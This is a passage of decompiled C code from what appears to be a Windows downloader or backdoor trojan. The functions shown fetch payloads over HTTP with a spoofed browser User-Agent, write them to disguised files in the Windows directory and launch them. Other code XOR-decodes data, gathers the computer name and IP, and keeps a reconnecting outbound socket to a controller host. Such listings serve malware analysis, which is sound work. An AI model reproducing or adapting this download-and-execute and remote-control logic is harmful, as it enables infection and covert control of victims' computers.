    g3 = 0;
    g4 = (int32_t)(struct _OVERLAPPED *)0x3e800;
    int32_t result2;
    if (mem == NULL) {
        // 0x4021f3
        result2 = 0;
        // branch -> 0x4022e6
    } else {
        // 0x40218f
        int32_t nNumberOfBytesToWrite; // bp-8
        int32_t v6 = &nNumberOfBytesToWrite; // 0x40218f
        char * str = (char *)&nNumberOfBytesToWrite; // bp-1060
        g5 = (int32_t)&g68;
        int32_t v7 = function_4019e2((struct sockaddr *)&g50, 80, (int32_t)&g39, (int32_t)&g68, 0, v5, v6, 0); // 0x4021a8
        struct _OVERLAPPED * v8; // 0x4022dc
        if (v7 != 0) {
            struct _OVERLAPPED * str2 = (struct _OVERLAPPED *)"10.14"; // bp-1056
            int32_t v9 = g6; // 0x4021c0
            str = (char *)v9;
            *(char *)(v9 + nNumberOfBytesToWrite) = (char)g3;
            g4 = (int32_t)str2;
            if (strcmp(str, (char *)str2) != 0) {
                int32_t v10 = g3; // 0x4021d6
                str = (char *)&nNumberOfBytesToWrite;
                int32_t v11 = function_4019e2((struct sockaddr *)&g50, 80, (int32_t)&g38, g5, v10, g6, v6, v10); // 0x4021e7
                if (v11 != 0) {
                    int32_t v12 = g6; // 0x4021fd
                    g5 = v12 - 2;
                    *(char *)(v12 + nNumberOfBytesToWrite) = (char)g3;
                    // branch -> 0x402203
                    while (true) {
                        uint32_t v13 = g5; // 0x402208
                        if (v13 < g6 + nNumberOfBytesToWrite) {
                            // 0x402210
                            if (v13 != g3) {
                                int32_t str4 = v13 + 2; // 0x402218
                                char * str3 = (char *)str4; // 0x40221d
                                str = str3;
                                char * found_char_pos = strchr(str3, 13); // 0x402221
                                int32_t v14 = (int32_t)found_char_pos; // 0x402221
                                g5 = v14;
                                int32_t v15 = g3; // 0x40222a
                                if (v14 != v15) {
                                    // 0x40222f
                                    *found_char_pos = (char)v15;
                                    // branch -> 0x402231
                                }
                                // 0x402231
                                *(int32_t *)&str = str4;
                                int32_t strcmp_rc = strcmp((char *)str4, (char *)&g64); // 0x402239
                                g4 = (int32_t)(struct _OVERLAPPED *)&g64;
                                if (strcmp_rc == 0) {
                                    // break -> 0x402244
                                    break;
                                }
                                // continue -> 0x402203
                                continue;
                            }
                        }
                        // 0x4022dc
                        v8 = (struct _OVERLAPPED *)g6;
                        free(&v8->e0);
                        g4 = (int32_t)v8;
                        int32_t result = g3; // 0x4022e4
                        // branch -> 0x4022e6
                        // 0x4022e6
                        g5 = v4;
                        g6 = v3;
                        g3 = v2;
                        g2 = v1;
                        return result;
                    }
                    int32_t v16 = g3; // 0x402247
                    str = (char *)&nNumberOfBytesToWrite;
                    int32_t v17 = function_4019e2((struct sockaddr *)&g50, 80, (int32_t)&g44, (int32_t)&g68, v16, g6, v6, v16); // 0x40225c
                    if (v17 != 0) {
                        int32_t lpBuffer = 0; // bp-1040
                        str = (char *)&lpBuffer;
                        GetWindowsDirectoryA((char *)&lpBuffer, 1024);
                        str = (char *)&lpBuffer;
                        strcat((char *)&lpBuffer, "Xjapor_*ata");
                        int32_t dwShareMode = g3; // 0x402293
                        str = (char *)2;
                        int32_t * fileHandle = CreateFileA((char *)&lpBuffer, 0x40000000, dwShareMode, (struct _SECURITY_ATTRIBUTES *)dwShareMode, 2, 2, &((struct _OVERLAPPED *)dwShareMode)->e0); // 0x4022a0
                        g5 = (int32_t)fileHandle;
                        if (fileHandle != (int32_t *)-1) {
                            int32_t lpNumberOfBytesWritten = 0; // bp-16
                            str = (char *)&lpNumberOfBytesWritten;
                            bool v18 = WriteFile(fileHandle, &((struct _SECURITY_ATTRIBUTES *)g6)->e0, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, (struct _OVERLAPPED *)g3); // 0x4022b7
                            CloseHandle(&((struct _OVERLAPPED *)g5)->e0);
                            if ((int32_t)v18 != g3) {
                                // 0x4022cc
                                function_40511a((struct _STARTUPINFOA *)&lpBuffer);
                                g3 = 1;
                                // branch -> 0x4022dc
                            }
                        }
                    }
                    // 0x4022dc
                    v8 = (struct _OVERLAPPED *)g6;
                    free(&v8->e0);
                    g4 = (int32_t)v8;
                    result2 = g3;
                    // branch -> 0x4022e6
                } else {
                    // 0x4021f3
                    result2 = 0;
                    // branch -> 0x4022e6
                }
                // 0x4022e6
                g5 = v4;
                g6 = v3;
                g3 = v2;
                g2 = v1;
                return result2;
            }
        }
        // 0x4022dc
        v8 = (struct _OVERLAPPED *)g6;
        free(&v8->e0);
        g4 = (int32_t)v8;
        result2 = g3;
        // branch -> 0x4022e6
    }
    // 0x4022e6
    g5 = v4;
    g6 = v3;
    g3 = v2;
    g2 = v1;
    return result2;
}

// Address range: 0x4022eb - 0x4023c1
int32_t function_4022eb(void) {
    int32_t v1 = g2; // bp-4
    g2 = &v1;
    int32_t v2 = g3; // 0x4022f4
    int32_t v3 = g6; // 0x4022f5
    int32_t v4 = g5; // 0x4022f6
    int32_t * mem = malloc(0x3e800); // 0x4022fc
    int32_t v5 = (int32_t)mem; // 0x4022fc
    g3 = v5;
    g6 = 0;
    g4 = 0x3e800;
    if (mem != NULL) {
        // 0x40230f
        int32_t nNumberOfBytesToWrite; // bp-12
        int32_t v6 = function_4019e2((struct sockaddr *)&g50, 80, (int32_t)&g43, (int32_t)&g68, 0, v5, (int32_t)&nNumberOfBytesToWrite, 0); // 0x402327
        if (v6 != 0) {
            int32_t lpBuffer = 0; // bp-1040
            GetWindowsDirectoryA((char *)&lpBuffer, 1024);
            strcat((char *)&lpBuffer, "Xjapo_r*ata");
            int32_t * fileHandle = CreateFileA((char *)&lpBuffer, 0x40000000, g6, (struct _SECURITY_ATTRIBUTES *)g6, 2, 2, &((struct _OVERLAPPED *)g6)->e0); // 0x40236e
            g5 = (int32_t)fileHandle;
            if (fileHandle != (int32_t *)-1) {
                int32_t lpNumberOfBytesWritten = 0; // bp-16
                bool v7 = WriteFile(fileHandle, &((struct _SECURITY_ATTRIBUTES *)g3)->e0, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, (struct _OVERLAPPED *)g6); // 0x402385
                CloseHandle(&((struct _OVERLAPPED *)g5)->e0);
                struct _OVERLAPPED * v8 = (struct _OVERLAPPED *)g3; // 0x402398
                int32_t result; // 0x4023c1
                if ((int32_t)v7 != g6) {
                    // 0x4023a6
                    free(&v8->e0);
                    function_40511a((struct _STARTUPINFOA *)&lpBuffer);
                    result = 1;
                    // branch -> 0x4023bd
                } else {
                    // 0x40239b
                    free(&v8->e0);
                    // branch -> 0x4023a2
                    // 0x4023a2
                    result = 0;
                    // branch -> 0x4023bd
                }
                // 0x4023bd
                g5 = v4;
                g6 = v3;
                g3 = v2;
                g2 = v1;
                return result;
            }
        }
        // 0x402333
        // branch -> 0x40239b
        // 0x40239b
        free(&((struct _OVERLAPPED *)g3)->e0);
        // branch -> 0x4023a2
    }
    // 0x4023a2
    // branch -> 0x4023bd
    // 0x4023bd
    g5 = v4;
    g6 = v3;
    g3 = v2;
    g2 = v1;
    return 0;
}

// Address range: 0x4023c2 - 0x402507
int32_t function_4023c2(void) {
    int32_t v1 = g2; // bp-4
    g2 = &v1;
    int32_t v2 = g5; // 0x4023cd
    int32_t * mem = malloc(0x3e800); // 0x4023d3
    int32_t v3 = (int32_t)mem; // 0x4023d3
    g6 = v3;
    g3 = 0;
    g4 = 0x3e800;
    if (mem == NULL) {
        // 0x4024e8
        // branch -> 0x402503
        // 0x402503
        g5 = v2;
        return 0;
    }
    // 0x4023e6
    int32_t nNumberOfBytesToWrite; // bp-8
    int32_t v4 = &nNumberOfBytesToWrite; // 0x4023e6
    int32_t v5 = function_4019e2((struct sockaddr *)&g50, 80, (int32_t)&g41, (int32_t)&g68, 0, v3, v4, 0); // 0x4023fe
    if (v5 != 0) {
        int32_t v6 = g6; // 0x402411
        g5 = v6 - 2;
        *(char *)(v6 + nNumberOfBytesToWrite) = (char)g3;
        // branch -> 0x402417
        while (true) {
            uint32_t v7 = g5; // 0x40241c
            if (v7 < g6 + nNumberOfBytesToWrite) {
                // 0x402420
                if (v7 != g3) {
                    int32_t str = v7 + 2; // 0x402424
                    char * found_char_pos = strchr((char *)str, 13); // 0x40242d
                    int32_t v8 = (int32_t)found_char_pos; // 0x40242d
                    g5 = v8;
                    int32_t v9 = g3; // 0x402436
                    if (v8 != v9) {
                        // 0x40243b
                        *found_char_pos = (char)v9;
                        // branch -> 0x40243d
                    }
                    int32_t strcmp_rc = strcmp((char *)str, (char *)&g64); // 0x402445
                    g4 = (int32_t)&g64;
                    if (strcmp_rc == 0) {
                        // break -> 0x402458
                        break;
                    }
                    // continue -> 0x402417
                    continue;
                }
            }
            // 0x402452
            // branch -> 0x4024e1
            // 0x4024e1
            free(&((struct _OVERLAPPED *)g6)->e0);
            // branch -> 0x4024e8
            // 0x4024e8
            // branch -> 0x402503
            // 0x402503
            g5 = v2;
            return 0;
        }
        int32_t v10 = g3; // 0x40245b
        int32_t v11 = function_4019e2((struct sockaddr *)&g50, 80, (int32_t)&g42, (int32_t)&g68, v10, g6, v4, v10); // 0x402470
        if (v11 != 0) {
            int32_t lpBuffer = 0; // bp-1040
            GetWindowsDirectoryA((char *)&lpBuffer, 1024);
            strcat((char *)&lpBuffer, "Xjapor_o*ata");
            int32_t * fileHandle = CreateFileA((char *)&lpBuffer, 0x40000000, g3, (struct _SECURITY_ATTRIBUTES *)g3, 2, 2, &((struct _OVERLAPPED *)g3)->e0); // 0x4024b4
            g5 = (int32_t)fileHandle;
            if (fileHandle != (int32_t *)-1) {
                int32_t lpNumberOfBytesWritten = 0; // bp-16
                bool v12 = WriteFile(fileHandle, &((struct _SECURITY_ATTRIBUTES *)g6)->e0, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, (struct _OVERLAPPED *)g3); // 0x4024cb
                CloseHandle(&((struct _OVERLAPPED *)g5)->e0);
                struct _OVERLAPPED * v13 = (struct _OVERLAPPED *)g6; // 0x4024de
                int32_t result; // 0x402507
                if ((int32_t)v12 != g3) {
                    // 0x4024ec
                    free(&v13->e0);
                    function_40511a((struct _STARTUPINFOA *)&lpBuffer);
                    result = 1;
                    // branch -> 0x402503
                } else {
                    // 0x4024e1
                    free(&v13->e0);
                    // branch -> 0x4024e8
                    // 0x4024e8
                    result = 0;
                    // branch -> 0x402503
                }
                // 0x402503
                g5 = v2;
                return result;
            }
        }
        // 0x402452
        // branch -> 0x4024e1
        // 0x4024e1
        free(&((struct _OVERLAPPED *)g6)->e0);
        // branch -> 0x4024e8
    }
    // 0x4024e8
    // branch -> 0x402503
    // 0x402503
    g5 = v2;
    return 0;
}

// Address range: 0x402508 - 0x40267c
int32_t function_402508(void) {
    int32_t v1 = g2; // bp-4
    g2 = &v1;
    int32_t lpBuffer = 0; // bp-1036
    GetWindowsDirectoryA((char *)&lpBuffer, 1024);
    strcat((char *)&lpBuffer, "Xjapor_*ata");
    DeleteFileA((char *)&lpBuffer);
    GetWindowsDirectoryA((char *)&lpBuffer, 1024);
    strcat((char *)&lpBuffer, "Xjapo_r*ata");
    DeleteFileA((char *)&lpBuffer);
    GetWindowsDirectoryA((char *)&lpBuffer, 1024);
    strcat((char *)&lpBuffer, "Xjapor_o*ata");
    DeleteFileA((char *)&lpBuffer);
    g6 = 0x6832;
    g3 = 0x2710;
    g5 = 1;
    struct _OVERLAPPED * v2 = NULL; // bp-8
    // branch -> 0x4025a5
    while (true) {
      lab_0x4025a5:;
        struct fd_set * v3 = g34; // 0x4025a5
        g26 = 0;
        g24 = 0;
        if (v3 != NULL) {
            // 0x4025bc
            closesocket((int32_t)v3);
            // branch -> 0x4025c3
        }
        // 0x4025c3
        g34 = NULL;
        g66 = NULL;
        Sleep(50);
        int32_t result = function_40205c(); // 0x4025d5
        if (result != 0) {
            // 0x402678
            g2 = v1;
            return result;
        }
        int32_t result2 = function_40216f(); // 0x4025e2
        if (result2 != 0) {
            // 0x402678
            g2 = v1;
            return result2;
        }
        // 0x4025ef
        if (function_401bab() != 0) {
            // 0x4025f8
            if (function_401c03() != 0) {
                // 0x402601
                if (function_401def() != 0) {
                    // 0x40260a
                    if (function_4028eb() != 0) {
                        // 0x402618
                        v2 = (struct _OVERLAPPED *)g5;
                        ioctlsocket(*(int32_t *)&g34, -0x7ffb9982, (int32_t *)&v2);
                        g30 = 0;
                        g66 = (struct _OVERLAPPED *)g5;
                        int32_t lpThreadId = 0; // bp-12
                        CreateThread(NULL, 0, (int32_t (*)(int32_t *))"SVWh v@", NULL, 0, &lpThreadId);
                        g23 = (char *)g5;
                        // branch -> 0x402658
                        while (true) {
                            // 0x402658
                            if (g26 != 0) {
                                // 0x402661
                                function_402aa7();
                                // branch -> 0x402666
                            }
                            // 0x402666
                            if (g66 == NULL) {
                                goto lab_0x4025a5;
                            }
                            // 0x402673
                            Sleep(g5);
                            // branch -> 0x402658
                        }
                    }
                }
                // 0x402613
                Sleep(g3);
                // branch -> 0x4025a5
                continue;
            }
            // 0x402613
            Sleep(g3);
            // branch -> 0x4025a5
            continue;
        }
        // 0x402613
        Sleep(g3);
        // branch -> 0x4025a5
    }
}

// Address range: 0x40267d - 0x40277d
int32_t function_40267d(char * str, int32_t str3, int32_t a3, int32_t str5, int32_t a5, int32_t a6) {
    int32_t v1 = 0; // bp-19
    int32_t str4 = 58; // bp-20
    _itoa(a3, (char *)&v1, 10);
    int32_t str2 = (int32_t)str; // esi
    strcpy(str, a5 != 0 ? "POST " : "GET ");
    if (g59 != NULL) {
        // 0x4026c3
        strcat((char *)str2, "http://");
        strcat((char *)str2, (char *)str3);
        strcat((char *)str2, (char *)&str4);
        // branch -> 0x4026e4
    }
    // 0x4026e4
    strcat((char *)str2, (char *)str5);
    if (a5 == 1) {
        // 0x4026f5
        strcat((char *)str2, "/index.htm");
        // branch -> 0x402702
    }
    // 0x402702
    strcat((char *)str2, " HTTP/1.0\r\n");
    strcat((char *)str2, "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)\r\nHOST: ");
    strcat((char *)str2, (char *)str3);
    strcat((char *)str2, (char *)&str4);
    strcat((char *)str2, "\r\nPragma: no-cache");
    if (a5 == 1) {
        // 0x40273f
        strcat((char *)str2, "\r\nContent-Length: ");
        _itoa(a6, (char *)&str4, 10);
        strcat((char *)str2, (char *)&str4);
        strcat((char *)str2, "\r\nProxy-Connection: Keep-Alive");
        // branch -> 0x40276d
    }
    // 0x40276d
    g4 = (int32_t)"\r\n\r\n";
    return (int32_t)strcat((char *)str2, "\r\n\r\n");
}

// Address range: 0x40277e - 0x40282f
int32_t function_40277e(int32_t sock) {
    // 0x40277e
    g1 = 0x2008;
    function_405a10();
    int32_t v1 = 0; // ebx
    int32_t buf; // bp-8204
    int32_t buf2 = &buf; // esi
    int32_t v2 = recv(sock, (char *)&buf, 1, 0); // 0x4027aa20
    if (v2 == 0) {
        // 0x40282b
        g6 = 0;
        g3 = 0;
        return -1;
    }
    int32_t v3 = 0;
    int32_t v4 = 0;
    int32_t v5;
    int32_t v6;
    while (true) {
        // 0x4027b4
        if (v2 == -1) {
            // 0x4027b9
            if (WSAGetLastError() != 0x2733) {
                // 0x40282b
                g6 = v3;
                g3 = v4;
                return -1;
            }
            // 0x4027c6
            Sleep(1);
            int32_t v7 = v3 + 1; // 0x4027cd
            int32_t v8 = v3 - 0x1388; // 0x4027d0
            if (v8 == 0 || v8 < 0 != (0x1387 - v3 & v3) < 0) {
                v6 = v4;
                v5 = v7;
                goto lab_0x4027a2;
            }
            // 0x40282b
            g6 = v7;
            g3 = v4;
            return -1;
        }
        int32_t v9 = buf2; // 0x4027d9
        char v10 = *(char *)v9; // 0x4027d9
        int32_t v11;
        if (v10 != 13) {
            // 0x4027df
            if (v10 != 10) {
                // 0x4027e3
                v11 = 0;
                // branch -> 0x4027f2
              lab_0x4027f2:;
                int32_t v12 = v1 + 1; // 0x4027f2
                v1 = v12;
                buf2 = v9 + 1;
                if (v12 > 0x2000) {
                    // 0x40282b
                    g6 = v3;
                    g3 = v11;
                    return -1;
                }
                // 0x4027fc
                Sleep(1);
                v6 = v11;
                v5 = v3;
                // branch -> 0x4027a2
              lab_0x4027a2:;
                int32_t v13 = recv(sock, (char *)buf2, 1, 0); // 0x4027aa
                if (v13 == 0) {
                    // break -> 0x40282b
                    break;
                }
                v2 = v13;
                v3 = v5;
                v4 = v6;
                // continue -> 0x4027b4
                continue;
            }
        }
        int32_t v14 = v4 + 1; // 0x4027e9
        if (v14 < 4) {
            v11 = v14;
            goto lab_0x4027f2;
        }
        // 0x402802
        *(char *)(g2 - 0x2007 + v1) = 0;
        strstr((char *)&buf, "200 OK");
        // branch -> 0x40282b
        // 0x40282b
        g6 = v3;
        g3 = v14;
        return -1;
    }
    // 0x40282b
    g6 = v5;
    g3 = v6;
    return -1;
}

// Address range: 0x402830 - 0x402858
int32_t function_402830(int32_t a1, int32_t a2, char * a3, int32_t result) {
    // 0x402830
    *(int32_t *)result = a2;
    if (a2 < 1) {
        // 0x402858
        return result;
    }
    int32_t v1 = (int32_t)a3; // 0x40283e
    g4 = v1;
    int32_t result2 = a1 - v1; // 0x402847
    unsigned char v2 = *(char *)(result2 + v1) ^ 35; // 0x40284e
    *(char *)v1 = v2;
    int32_t v3 = g4 + 1; // 0x402853
    g4 = v3;
    int32_t v4 = a2 - 1; // 0x402854
    a2 = v4;
    // 0x402857
    // branch -> 0x40284b
    while (v4 != 0) {
        // 0x40284b
        // 0x40284b
        a2 = (int32_t)v2 | a2 & -256;
        v1 = v3;
        v2 = *(char *)(result2 + v1) ^ 35;
        *(char *)v1 = v2;
        v3 = g4 + 1;
        g4 = v3;
        v4 = a2 - 1;
        a2 = v4;
        // 0x402857
        // branch -> 0x40284b
    }
    // 0x402858
    return result2;
}

// Address range: 0x402859 - 0x4028cb
int32_t function_402859(void) {
    struct in_addr in; // 0x4028b0
    int32_t v1 = g2; // 0x402859
    int32_t nSize = 255; // bp-8
    GetComputerNameA((char *)&g64, &nSize);
    g65 = 0;
    int32_t name = 0; // bp-264
    struct timeval * str;
    char * dest_str; // 0x4028c3
    if (gethostname((char *)&name, 255) != 0) {
        str = (struct timeval *)&g68;
        // 0x4028be
        dest_str = strcpy((char *)&g63, (char *)str);
        g4 = (int32_t)str;
        g2 = v1;
        return (int32_t)dest_str;
    }
    struct hostent * v2 = gethostbyname((char *)&name); // 0x40289f
    if (v2 != NULL) {
        int32_t v3 = *(int32_t *)((int32_t)v2 + 12); // 0x4028a9
        in = (struct in_addr){
            .e0 = 0
        };
        in.e0 = *(int32_t *)*(int32_t *)v3;
        str = (struct timeval *)inet_ntoa(in);
        // branch -> 0x4028be
    } else {
        str = (struct timeval *)&g68;
    }
    // 0x4028be
    dest_str = strcpy((char *)&g63, (char *)str);
    g4 = (int32_t)str;
    g2 = v1;
    return (int32_t)dest_str;
}

// Address range: 0x4028cc - 0x4028ea
int32_t function_4028cc(char * name, int32_t a2, int32_t a3, int32_t a4) {
    struct in_addr in; // 0x4028e1
    struct hostent * v1 = gethostbyname(name); // 0x4028d0
    if (v1 == NULL) {
        // 0x4028e8
        return 0;
    }
    int32_t v2 = *(int32_t *)((int32_t)v1 + 12); // 0x4028da
    in = (struct in_addr){
        .e0 = 0
    };
    in.e0 = *(int32_t *)*(int32_t *)v2;
    return (int32_t)inet_ntoa(in);
}

// Address range: 0x4028eb - 0x402aa6
int32_t function_4028eb(void) {
    int32_t v1 = g3; // 0x4028f4
    g3 = -0x7ffffff6;
    int32_t v2 = g6; // 0x4028fb
    int32_t v3 = g5; // 0x4028fc
    g5 = 0;
    g6 = 1;
    int32_t timeout; // bp-16
    struct timeval * writefds; // bp-296
    int32_t addr; // bp-32
    int32_t lpThreadId; // bp-36
    struct timeval * v4; // bp-8
    int32_t result;
    int32_t readfds; // 0x402a33
    int32_t v5; // 0x402a5e
    int32_t v6; // 0x402a6e
    int32_t lpThreadAttributes; // 0x402a7f
    int32_t v7; // 0x402a3d
    int32_t * threadHandle; // 0x402a81
    int32_t v8; // 0x402a81
    int32_t v9; // 0x402a4d
    int32_t v10; // 0x402a63
    int32_t sock_fd; // 0x4029b4
    if (g52 != 0) {
        // 0x4028eb
        // branch -> 0x4029b0
        // 0x4029b0
        sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
        g34 = (struct fd_set *)sock_fd;
        if (sock_fd == -1) {
            // 0x402a9c
            // branch -> 0x402aa2
            // 0x402aa2
            g5 = v3;
            g6 = v2;
            g3 = v1;
            return 0;
        }
        // 0x4029c8
        v4 = (struct timeval *)g6;
        ioctlsocket(sock_fd, -0x7ffb9982, (int32_t *)&v4);
        timeout = 60;
        writefds = (struct timeval *)g6;
        addr = 2;
        htons(g58);
        inet_addr((char *)&g57);
        connect(*(int32_t *)&g34, (struct sockaddr *)&addr, 16);
        readfds = g5;
        v7 = select((int32_t)g34 + 1, (struct fd_set *)(int32_t (*)(int32_t *))readfds, (struct fd_set *)&writefds, (struct fd_set *)readfds, (struct timeval *)&timeout);
        if (v7 < 1) {
            // 0x402a90
            closesocket((int32_t)g34);
            // branch -> 0x402a9c
            // 0x402a9c
            // branch -> 0x402aa2
            // 0x402aa2
            g5 = v3;
            g6 = v2;
            g3 = v1;
            return 0;
        }
        // 0x402a47
        g53 = (struct timeval *)g6;
        // branch -> 0x402a4d
        // 0x402a4d
        v9 = g5;
        v10 = v9;
        if (g52 != v9) {
            // 0x402a5e
            v5 = g67;
            lpThreadAttributes = v10;
            if (v5 != v10) {
                // 0x402a67
                CloseHandle(&((struct timeval *)v5)->e0);
                v6 = g5;
                g67 = v6;
                lpThreadAttributes = v6;
                // branch -> 0x402a74
            }
            // 0x402a74
            threadHandle = CreateThread((struct _SECURITY_ATTRIBUTES *)lpThreadAttributes, lpThreadAttributes, (int32_t (*)(int32_t *))0x402d8f, &((struct fd_set *)lpThreadAttributes)->e0, lpThreadAttributes, &lpThreadId);
            v8 = (int32_t)threadHandle;
            g67 = v8;
            if (v8 != g5) {
                // 0x402aa0
                result = g6;
                // branch -> 0x402aa2
            } else {
                // 0x402a90
                closesocket((int32_t)g34);
                // branch -> 0x402a9c
                // 0x402a9c
                result = 0;
                // branch -> 0x402aa2
            }
            // 0x402aa2
            g5 = v3;
            g6 = v2;
            g3 = v1;
            return result;
        }
        // 0x402a55
        if (function_402f9b() == 0) {
            // 0x402a9c
            // branch -> 0x402aa2
            // 0x402aa2
            g5 = v3;
            g6 = v2;
            g3 = v1;
            return 0;
        }
        // 0x402a55
        v10 = g5;
        // branch -> 0x402a5e
        // 0x402a5e
        v5 = g67;
        lpThreadAttributes = v10;
        if (v5 != v10) {
            // 0x402a67
            CloseHandle(&((struct timeval *)v5)->e0);
            v6 = g5;
            g67 = v6;
            lpThreadAttributes = v6;
            // branch -> 0x402a74
        }
        // 0x402a74
        lpThreadId = 0;
        threadHandle = CreateThread((struct _SECURITY_ATTRIBUTES *)lpThreadAttributes, lpThreadAttributes, (int32_t (*)(int32_t *))0x402d8f, &((struct fd_set *)lpThreadAttributes)->e0, lpThreadAttributes, &lpThreadId);
        v8 = (int32_t)threadHandle;
        g67 = v8;
        if (v8 != g5) {
            // 0x402aa0
            result = g6;
            // branch -> 0x402aa2
        } else {
            // 0x402a90
            closesocket((int32_t)g34);
            // branch -> 0x402a9c
            // 0x402a9c
            result = 0;
            // branch -> 0x402aa2
        }
        // 0x402aa2
        g5 = v3;
        g6 = v2;
        g3 = v1;
        return result;
    }
    // 0x40290e
    g53 = NULL;
    int32_t sock_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x402918
    g34 = (struct fd_set *)sock_fd2;
    if (sock_fd2 == -1) {
        // 0x402a9c
        // branch -> 0x402aa2
        // 0x402aa2
        g5 = v3;
        g6 = v2;
        g3 = v1;
        return 0;
    }
    // 0x40292c
    v4 = (struct timeval *)g6;
    ioctlsocket(sock_fd2, -0x7ffb9982, (int32_t *)&v4);
    timeout = 60;
    writefds = (struct timeval *)g6;
    addr = 2;
    htons(81);
    connect(*(int32_t *)&g34, (struct sockaddr *)&addr, 16);
    int32_t readfds2 = g5; // 0x40298c
    int32_t v11 = select((int32_t)g34 + 1, (struct fd_set *)(int32_t (*)(int32_t *))readfds2, (struct fd_set *)&writefds, (struct fd_set *)readfds2, (struct timeval *)&timeout); // 0x402996
    if (v11 >= 1) {
        // 0x402a4d
        v9 = g5;
        v10 = v9;
        if (g52 != v9) {
            // 0x402a5e
            v5 = g67;
            lpThreadAttributes = v10;
            if (v5 != v10) {
                // 0x402a67
                CloseHandle(&((struct timeval *)v5)->e0);
                v6 = g5;
                g67 = v6;
                lpThreadAttributes = v6;
                // branch -> 0x402a74
            }
            // 0x402a74
            threadHandle = CreateThread((struct _SECURITY_ATTRIBUTES *)lpThreadAttributes, lpThreadAttributes, (int32_t (*)(int32_t *))0x402d8f, &((struct fd_set *)lpThreadAttributes)->e0, lpThreadAttributes, &lpThreadId);
            v8 = (int32_t)threadHandle;
            g67 = v8;
            if (v8 != g5) {
                // 0x402aa0
                result = g6;
                // branch -> 0x402aa2
            } else {
                // 0x402a90
                closesocket((int32_t)g34);
                // branch -> 0x402a9c
                // 0x402a9c
                result = 0;
                // branch -> 0x402aa2
            }
            // 0x402aa2
            g5 = v3;
            g6 = v2;
            g3 = v1;
            return result;
        }
        // 0x402a55
        if (function_402f9b() == 0) {
            // 0x402a9c
            // branch -> 0x402aa2
            // 0x402aa2
            g5 = v3;
            g6 = v2;
            g3 = v1;
            return 0;
        }
        // 0x402a55
        v10 = g5;
        // branch -> 0x402a5e
        // 0x402a5e
        v5 = g67;
        lpThreadAttributes = v10;
        if (v5 != v10) {
            // 0x402a67
            CloseHandle(&((struct timeval *)v5)->e0);
            v6 = g5;
            g67 = v6;
            lpThreadAttributes = v6;
            // branch -> 0x402a74
        }
        // 0x402a74
        threadHandle = CreateThread((struct _SECURITY_ATTRIBUTES *)lpThreadAttributes, lpThreadAttributes, (int32_t (*)(int32_t *))0x402d8f, &((struct fd_set *)lpThreadAttributes)->e0, lpThreadAttributes, &lpThreadId);
        v8 = (int32_t)threadHandle;
        g67 = v8;
        if (v8 != g5) {
            // 0x402aa0
            result = g6;
            // branch -> 0x402aa2
        } else {
            // 0x402a90
            closesocket((int32_t)g34);
            // branch -> 0x402a9c
            // 0x402a9c
            result = 0;
            // branch -> 0x402aa2
        }
        // 0x402aa2
        g5 = v3;
        g6 = v2;
        g3 = v1;
        return result;
    }
    int32_t protocol = g5; // 0x4029a4
    if ((int32_t)g59 != protocol) {
        // 0x4029a4
        // branch -> 0x4029b0
        // 0x4029b0
        sock_fd = socket(AF_INET, g6, protocol);
        g34 = (struct fd_set *)sock_fd;
        if (sock_fd != -1) {
            // 0x4029c8
            v4 = (struct timeval *)g6;
            ioctlsocket(sock_fd, -0x7ffb9982, (int32_t *)&v4);
            timeout = 60;
            writefds = (struct timeval *)g6;
            addr = 2;
            htons(g58);
            inet_addr((char *)&g57);
            connect(*(int32_t *)&g34, (struct sockaddr *)&addr, 16);
            readfds = g5;
            v7 = select((int32_t)g34 + 1, (struct fd_set *)(int32_t (*)(int32_t *))readfds, (struct fd_set *)&writefds, (struct fd_set *)readfds, (struct timeval *)&timeout);
            if (v7 < 1) {
                // 0x402a90
                closesocket((int32_t)g34);
                // branch -> 0x402a9c
                // 0x402a9c
                // branch -> 0x402aa2
                // 0x402aa2
                g5 = v3;
                g6 = v2;
                g3 = v1;
                return 0;
            }
            // 0x402a47
            g53 = (struct timeval *)g6;
            // branch -> 0x402a4d
            // 0x402a4d
            v9 = g5;
            v10 = v9;
            if (g52 != v9) {
                // 0x402a5e
                v5 = g67;
                lpThreadAttributes = v10;
                if (v5 != v10) {
                    // 0x402a67
                    CloseHandle(&((struct timeval *)v5)->e0);
                    v6 = g5;
                    g67 = v6;
                    lpThreadAttributes = v6;
                    // branch -> 0x402a74
                }
                // 0x402a74
                threadHandle = CreateThread((struct _SECURITY_ATTRIBUTES *)lpThreadAttributes, lpThreadAttributes, (int32_t (*)(int32_t *))0x402d8f, &((struct fd_set *)lpThreadAttributes)->e0, lpThreadAttributes, &lpThreadId);
                v8 = (int32_t)threadHandle;
                g67 = v8;
                if (v8 != g5) {
                    // 0x402aa0
                    result = g6;
                    // branch -> 0x402aa2
                } else {
                    // 0x402a90
                    closesocket((int32_t)g34);
                    // branch -> 0x402a9c
                    // 0x402a9c
                    result = 0;
                    // branch -> 0x402aa2
                }
                // 0x402aa2
                g5 = v3;
                g6 = v2;
                g3 = v1;
                return result;
            }
            // 0x402a55
            if (function_402f9b() == 0) {
                // 0x402a9c
                // branch -> 0x402aa2
                // 0x402aa2
                g5 = v3;
                g6 = v2;
                g3 = v1;
                return 0;
            }
            // 0x402a55
            v10 = g5;
            // branch -> 0x402a5e
            // 0x402a5e
            v5 = g67;
            lpThreadAttributes = v10;
            if (v5 != v10) {
                // 0x402a67
                CloseHandle(&((struct timeval *)v5)->e0);
                v6 = g5;
                g67 = v6;
                lpThreadAttributes = v6;
                // branch -> 0x402a74
            }
            // 0x402a74
            threadHandle = CreateThread((struct _SECURITY_ATTRIBUTES *)lpThreadAttributes, lpThreadAttributes, (int32_t (*)(int32_t *))0x402d8f, &((struct fd_set *)lpThreadAttributes)->e0, lpThreadAttributes, &lpThreadId);
            v8 = (int32_t)threadHandle;
            g67 = v8;
            if (v8 != g5) {
                // 0x402aa0
                result = g6;
                // branch -> 0x402aa2
            } else {
                // 0x402a90
                closesocket((int32_t)g34);
                // branch -> 0x402a9c
                // 0x402a9c
                result = 0;
                // branch -> 0x402aa2
            }
            // 0x402aa2
            g5 = v3;
            g6 = v2;
            g3 = v1;
            return result;
        }
    }
    // 0x402a9c
    // branch -> 0x402aa2
    // 0x402aa2
    g5 = v3;
    g6 = v2;
    g3 = v1;
    return 0;
}

